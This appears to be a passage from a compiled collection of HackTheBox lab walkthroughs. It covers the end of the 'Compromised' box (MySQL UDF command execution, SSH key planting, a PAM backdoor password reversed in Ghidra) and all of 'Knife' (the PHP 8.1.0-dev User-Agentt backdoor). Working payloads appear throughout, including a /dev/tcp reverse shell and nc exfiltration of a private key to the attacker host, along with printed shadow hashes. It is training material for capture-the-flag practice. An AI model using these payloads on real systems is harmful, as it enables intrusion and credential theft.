_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false
```

hmm, boxname is "Compromised" and we get mysql creds and mysql has /bin/bash in /etc/passwd...
google "mysql backdoor"...
hmm we find out, that User Defined Functions (UDF) can be used,
so lets look at udf in our pseudoshell:

``` bash
> mysql -u root -pchangethis -e "select * from mysql.func;"
name    ret     dl      type
exec_cmd        0       libmysql.so     function
```

alright we found the udf called "exec_cmd"
lets try executing a simple command:

``` bash
> mysql -u root -pchangethis -e "select exec_cmd('id')"
exec_cmd('id')
uid=111(mysql) gid=113(mysql) groups=113(mysql)\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
```

what we can do now: add our public key to authorized keys:
first create a public and private key on your kali machine:

``` bash
root@kali:~/hackthebox/machine/compromised# ssh-keygen -t ed25519 -f ./key
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./key
Your public key has been saved in ./key.pub
The key fingerprint is:
SHA256:HPqYLVvu3/R18DoJNMmkbT4wlENJ63Smbx3EkqNBu5g root@kali
The key's randomart image is:
+--[ED25519 256]--+
|         o+o     |
|         .=o.o   |
|        ..=**.o  |
|       o *+BB+   |
|      . E =* .o  |
|       =   .+. + |
|      + +   +o..+|
|       =   + .oo.|
|      ..o.. . o. |
+----[SHA256]-----+
root@kali:~/hackthebox/machine/compromised# cat key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD9+JBVupuMTJ87k29H8HBXCEQC/zi59/mR8K+K+S527AAAAJAmEMXWJhDF
1gAAAAtzc2gtZWQyNTUxOQAAACD9+JBVupuMTJ87k29H8HBXCEQC/zi59/mR8K+K+S527A
AAAEC6pQZXCMMauEJqmB51/2UgSeuo1GzOnsO3S05SENXJa/34kFW6m4xMnzuTb0fwcFcI
RAL/OLn3+ZHwr4r5LnbsAAAACXJvb3RAa2FsaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
root@kali:~/hackthebox/machine/compromised# ls
45267.py  a.tar.gz  bypass.php  exp.py  key  key.pub  pshell.sh  shop
root@kali:~/hackthebox/machine/compromised# cat key.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP34kFW6m4xMnzuTb0fwcFcIRAL/OLn3+ZHwr4r5Lnbs root@kali
```

now copy the contents of key.pub and put it in the authorized keys of mysql account with the pseudoshell you have:
of course replace it with your public key, that you copied...

``` bash
mysql -u root -pchangethis -e "select exec_cmd('mkdir /var/lib/mysql/.ssh')"
mysql -u root -pchangethis -e "select exec_cmd('echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP34kFW6m4xMnzuTb0fwcFcIRAL/OLn3+ZHwr4r5Lnbs root@kali > /var/lib/mysql/.ssh/authorized_keys')"
```

ssh into the box:

``` bash
root@kali:~/hackthebox/machine/compromised# ssh -i key mysql@10.10.10.207
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
mysql@compromised:~$ id
uid=111(mysql) gid=113(mysql) groups=113(mysql)
mysql@compromised:~$ whoami
mysql
```

enumerate the home folder:

``` bash
mysql@compromised:~$ grep -nrli sysadmin
strace-log.dat
mysql@compromised:~$ cat strace-log.dat | grep password
22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
22227 03:11:09 write(2, "[Warning] Using a password on th"..., 73) = 73
22102 03:11:10 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22228 03:11:15 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changeme"], 0x55bc62467900 /* 21 vars */) = 0
22228 03:11:15 write(2, "[Warning] Using a password on th"..., 73) = 73
22102 03:11:16 write(2, "mysql -u root --password='change"..., 35) = 35
22229 03:11:18 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changethis"], 0x55bc62467900 /* 21 vars */) = 0
22229 03:11:18 write(2, "[Warning] Using a password on th"..., 73) = 73
22232 03:11:52 openat(AT_FDCWD, "/etc/pam.d/common-password", O_RDONLY) = 5
22232 03:11:52 read(5, "#\n# /etc/pam.d/common-password -"..., 4096) = 1440
22232 03:11:52 write(4, "[sudo] password for sysadmin: ", 30) = 30
```

we find the password

``` bash
["mysql", "-u", "root", "--password=3*NLJE32I$Fe"]
```

now change to sysadmin user with the password = 3*NLJE32I$Fe
and also get the user.txt :) :) :)

``` bash
mysql@compromised:~$ su sysadmin
Password: 
sysadmin@compromised:/var/lib/mysql$ cd
sysadmin@compromised:~$ ls
user.txt
sysadmin@compromised:~$ cat user.txt
9b8e8c9f70062d3e9889e214fe7ccdb9
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb93.jpg)

#### privilege esclation

now look at the modified files between 14.07 and today:

``` bash
sysadmin@compromised:~$ find / -newermt "2020-07-14" ! -newermt "2020-09-16" -type f 2>/dev/null
/etc/ssh/sshd_config
/etc/ld.so.cache
/etc/fstab
/etc/ufw/ufw.conf
/etc/ufw/user.rules
/etc/ufw/user6.rules
/etc/apache2/apache2.conf
/etc/network/interfaces
/lib/x86_64-linux-gnu/security/.pam_unix.so
/lib/x86_64-linux-gnu/security/pam_unix.so
...
```

/lib/x86_64-linux-gnu/security/pam_unix.so is strange...
why is there a /lib/x86_64-linux-gnu/security/.pam_unix.so?
maybe another backdoor in pam and /lib/x86_64-linux-gnu/security/.pam_unix.so is a backup?
lets look at it in a reversing program (i will use ghidra).
first download the pam_unix.so to our kali machine with scp:

``` bash
root@kali:~/hackthebox/machine/compromised# scp sysadmin@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so ./pam_unix.so
sysadmin@10.10.10.207's password: 
pam_unix.so
#password = 3*NLJE32I$Fe
```

looking at the functions, find the important authenticate function
and in there we find the string backdoor.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb94.jpg)

this means, if our password matches the backdoor string, we can get root.
now lets reverse the backdoor string.
On the Listing window we can just rightclick the value and click on convert -> Char Sequence

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb95.jpg)

then we got two separated strings, combine them together

``` bash
RAX,"zlke~U3E" + RAX,"nv82m2-\x00"

result: zlke~U3Env82m2-
```

this gives us the the password: zlke~U3Env82m2-
we can change to root with this, and get root flag:

``` bash
sysadmin@compromised:~$ su root
Password: 
root@compromised:/home/sysadmin# cd
root@compromised:~# id
uid=0(root) gid=0(root) groups=0(root)
root@compromised:~# ls
root.txt
root@compromised:~# cat root.txt
7017dc92e57aa31b32d755a062da5d8f
# password = zlke~U3Env82m2-
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb96.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb97.jpg)

#### Summary of knowledge

 - Source code leaked admin password
 - LiteCart 2.1.2 - Arbitrary File Upload  
 - change python exp script
 - php disable_functions bypass with PHP 7.0-7.3 disable_functions bypass PoC
 - bash shell script
 - ssh generate to get mysql shell
 - mysql User Defined Functions (UDF) commands excecution
 - home folder passwords leaked
 - use ghidra to reverse pam_unix.so file find backdoor string to get password

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end compromised -->

</details>

<a id="case-knife"></a>

## 开发版后门与 Ruby sudo

PHP 开发版的异常请求处理提供命令执行，后续 Ruby 工具的 sudo 权限形成独立提权点。原版本标识与请求细节保留。

<p class="kb-provenance">来源 knife · 原记录 2021-05-23 · 16 个代码块 · 8 处图片引用</p>

<details class="kb-evidence" id="record-knife">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start knife -->

#### introduce

OS: Linux
Difficulty: Easy
Points:	20
Release:	22 May 2021
IP:	10.10.10.242

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1985.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration
#### PORT
|Port|Service|Version|
|----|----|----|
|22|SSH|Openssh 8.2p1|
|80|HTTP|Apache httpd 2.4.41|

#### NMAP
```bash
# Nmap 7.91 scan initiated Sun May 23 01:14:04 2021 as: nmap -A -v -T4 -oN intial.nmap 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/23%OT=22%CT=1%CU=36992%PV=Y%DS=2%DC=T%G=Y%TM=60A9AC7
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 37.562 days (since Thu Apr 15 11:45:44 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   118.25 ms 10.10.14.1
2   117.19 ms 10.10.10.242

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 23 01:14:37 2021 -- 1 IP address (1 host up) scanned in 34.30 seconds
```
From nmap result one thing caught my and that is it an apache httpd server instead of regular nginx in all the HackTheBox Machine.

As the latest release for apache httpd is 2.4.46 there could be a known vuln in 2.4.41 so I looked for it on web.

Looking for it I stumbled around this Rapid7 Post https://www.rapid7.com/db/vulnerabilities/apache-httpd-cve-2020-1934/.

But there is one concerning thing about this exploit you need to have mod\_proxy\_ftp

module running and have FTP backend which we know nothing of.

#### Web-Visting

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife1.png)

We can find this static page and nothing intresting in it. 

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife2.png)

looking the source code found pen.js which looked intresting but after looking at it got nothing intresting.

Also added knife.htb in /etc/hosts to look for sub-domain but interestingly we found the default nginx page.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife3.png)

This was intresting.
But let's go back to your main page.
Looking for vulns I found one intresting thing that php 8.1.x-dev was backdoored by some hackers.
You can find articles on it.

 - [PHP backdoored via Git hack: It’s no joke, so don't be a fool](https://techbeacon.com/security/php-backdoored-git-hack-its-no-joke-so-dont-be-fool)

 - [Backdoor added to PHP source code in Git server breach](https://www.welivesecurity.com/2021/03/30/backdoor-php-source-code-git-server-breach/)

This is intresting as server is leaking the the version of PHP.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife4.png)

Wappalyzer detected it.
Looking through bunch of article finally came up to this one where it showed how to exploit this backdoored by some troll hackers.

 - [PHP 8.1.0-dev 开发版本后门事件](https://blog.csdn.net/zy15667076526/article/details/116447864)

The website is originally in chinese but the google translate works fine.
So let's see if your PHP is dev version or not.

```bash
kali@kali:~/HackTheBox/Knife$ curl -i http://10.10.10.242/
HTTP/1.1 200 OK
Date: Sun, 23 May 2021 02:31:24 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

Looking at X-Powered-By header we can say that indeed we are in luck and the version is PHP/8.1.0-dev.

#### Exploitation

Reading throught the article found out that the backdoor can be accessed using User-Agent Header to execute the code.
We have to append the string zerodium which is also one of the leading zero day vuln finder firm.
so let's try PoC for this exploit.

```bash
┌──(root💀kali)-[~/hackthebox/machine/knife]
└─# curl -i -s -k -H 'User-Agentt: zerodiumvar_dump(2*3);' http://10.10.10.242/
HTTP/1.1 200 OK
Date: Sun, 23 May 2021 04:34:01 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

int(6)
<!DOCTYPE html>
<html lang="en" >
...
```

Looks like we triggered the RCE let's get going and get try to excute system commands.

```bash
┌──(root💀kali)-[~/hackthebox/machine/knife]
└─# curl -i -s -k -H 'User-Agentt: zerodiumsystem("id");' http://10.10.10.242                                                     
HTTP/1.1 200 OK
Date: Sun, 23 May 2021 04:35:06 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

uid=1000(james) gid=1000(james) groups=1000(james)
```

Looks like the web server is running as james so one less step for us.
Let's get the REV-Shell.

```bash
kali@kali:~/HackTheBox/Knife$ curl -i -s -k -H $'User-Agentt: zerodiumsystem(\"bash -c \'bash -i >& /dev/tcp/10.10.14.18/2333 0>&1\'\");' http://10.10.10.242
```

And boom we have the shell and user.txt

```bash
┌──(root💀kali)-[~/hackthebox/machine/knife]
└─# nc -lvp 2333                                                                                                                  
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::2333
Ncat: Listening on 0.0.0.0:2333
Ncat: Connection from 10.10.10.242.
Ncat: Connection from 10.10.10.242:34454.
bash: cannot set terminal process group (1020): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ id
id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:/$ whoami
whoami
james
james@knife:~$ ls
ls
user.txt
james@knife:~$ cat user.txt
cat user.txt
945ec57fe12663455c03058393f2abff
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1986.jpg)

#### PrivESC
#### SSH Access

Before PrivESC let's just get the stable shell looking into users .ssh we found the key id_rsa

```bash
cd .ssh
cp id_rsa.pub authorized_keys
nc 10.10.14.18 1111 < id_rsa   (target machine)
nc -lvp 1111 > id_rsa    (local kali machine)
```

and then in your shell

```bash
kali@kali:~/HackTheBox/Knife$ nc -lvp 1111 > id_rsa
listening on [any] 1111 ...
connect to [YOUR IP] from (UNKNOWN) [10.10.10.242] 37114
┌──(root💀kali)-[~/hackthebox/machine/knife]
└─# chmod 700 id_rsa                                                                                                              
┌──(root💀kali)-[~/hackthebox/machine/knife]
└─# ssh -i id_rsa james@10.10.10.242                                                                                              
The authenticity of host '10.10.10.242 (10.10.10.242)' can't be established.
ECDSA key fingerprint is SHA256:b8jYX4F9OUtvZffH50q3L3B4hrSL/TxxPuue0hlbvRU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.242' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 23 May 2021 04:44:53 AM UTC

  System load:             0.07
  Usage of /:              51.3% of 9.72GB
  Memory usage:            57%
  Swap usage:              0%
  Processes:               337
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.242
  IPv6 address for ens160: dead:beef::250:56ff:feb9:7b4d


18 updates can be applied immediately.
13 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


james@knife:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:~$ whoami
james
```

Now we have the stable shell now lets enumerate for PrivESC.

#### Enumeration

```bash
james@knife:~$ cat ex.rb 
puts File.read('/etc/shadow')
```

Looking into user's home directory we can see an intresting ruby file which can read /etc/shadow but the catch is we dont have ruby on the box or at least on the desired path and the desired name.

#### sudo -l
```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Analysing the file /usr/bin/knife

```bash
james@knife:~$ file /usr/bin/knife 
/usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife
```

It's symbolic link to another file /opt/chef-workstation/bin/knife.
looking at the directory /opt/chef-workstation we can see it a ruby installation.

```bash
james@knife:~$ ls /opt/chef-workstation/
bin  components  embedded  gem-version-manifest.json  gitbin  LICENSE  LICENSES  version-manifest.json  version-manifest.txt
```

so basically on this box ruby commands can be run using /usr/bin/knife.
running /usr/bin/knife we get the big help menu.

```bash
james@knife:~$ sudo /usr/bin/knife
<-----SNIP------>
** EXEC COMMANDS **
knife exec [SCRIPT] (options)
```

Now let's run our ex.rb script

```bash
james@knife:~$ sudo /usr/bin/knife exec ex.rb

root:$6$LCKz7Uz/FuWPPJ6o$LaOquetpLJIhOzr7YwJzFPX4NdDDHokHtUz.k4S1.CY7D/ECYVfP4Q5eS43/PMtsOa5up1ThgjB3.xUZsHyHA1:18754:0:99999:7:::
daemon:*:18659:0:99999:7::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18753:0:99999:7:::
sshd:*:18753:0:99999:7:::
systemd-coredump:!!:18753::::::
james:$6$S4BgtW0nZi/8w.C0$pREFaCmQmAue0cm6eTgvF.vFdhsIdTr5q6PdrMVNCw4hc7TmlSqAcgMz0yOBG7mT6GcoH9gGbo.zLLG/VeT31/:18754:0:99999:7:::
lxd:!:18753::::::
opscode:!:18754::::::
opscode-pgsql:!:18754::::::
```

Now we can write our own ruby script to run the system commands.
I wrote a simple ruby script to run /bin/bash

```bash
james@knife:~$ echo "system('/bin/bash')" > getroot.rb
james@knife:~$ cat getroot.rb 
system('/bin/bash')
james@knife:~$ sudo /usr/bin/knife exec getroot.rb
root@knife:/home/james# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root now so let's get all the flags.

``` bash
james@knife:~$ echo "system('/bin/bash')" > getroot.rb
james@knife:~$ cat getroot.rb 
system('/bin/bash')
james@knife:~$ sudo /usr/bin/knife exec getroot.rb
root@knife:/home/james# id
uid=0(root) gid=0(root) groups=0(root)
root@knife:/home/james# whoami
root
root@knife:/home/james# cd
root@knife:~# ls
delete.sh  root.txt  snap
root@knife:~# cat root.txt 
bb5ea8e23a0de786ce9def00513a2121
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1987.jpg)

#### Summary of knowledge

 - PHP 8.1.0-dev develop version backdoor getshell
 - ruby script privesc

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end knife -->

</details>

